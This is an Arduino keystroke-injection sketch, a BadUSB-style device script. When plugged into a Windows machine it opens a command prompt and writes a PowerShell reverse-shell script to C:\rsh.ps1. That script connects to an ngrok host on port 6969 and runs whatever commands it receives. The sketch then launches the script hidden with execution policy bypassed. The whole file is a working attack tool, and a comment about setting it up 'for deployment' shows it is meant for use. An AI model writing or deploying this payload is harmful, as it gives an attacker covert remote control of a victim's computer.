#include "Keyboard.h"

// change this to false for deployment. it's set to true so that
// the keyboard doesn't continually get hijacked while
// developing the code for this
bool injected = false;

void setup() {
  if (injected == false) {
    Keyboard.begin();
  }
}

void loop() {

  while (injected == true) {
    delay(500);
  }

  delay(4500);
  // OS logo, Command (⌘) on Mac
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');

  Keyboard.releaseAll();

  delay(500);
  Keyboard.print("cmd");
  delay(500);
  // enter:
  Keyboard.write(KEY_RETURN);

  delay(1800);

  Keyboard.print("echo $client = New-Object System.Net.Sockets.TCPClient(\"2.tcp.us-cal-1.ngrok.io\",6969);$stream = $client.GetStream();[byte[]]$bytes = 0..65535^|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding^).GetString($bytes,0, $i^);$sendback = (iex $data 2^>^&1 ^| Out-String ^);$sendback2 = $sendback + \"PS \" + ^(pwd^).Path + \"> \";$sendbyte = ^([text.encoding]::ASCII^).GetBytes($sendback2^);$stream.Write($sendbyte,0,$sendbyte.Length^);$stream.Flush(^)};$client.Close() > \"C:\\rsh.ps1\"");


  Keyboard.write(KEY_RETURN);
  delay(1100);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1100);

  Keyboard.print("cmd /c start /min \"\" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \"C:\\rsh.ps1\"");
  Keyboard.write(KEY_RETURN);


  Keyboard.end();
  injected = true;
}
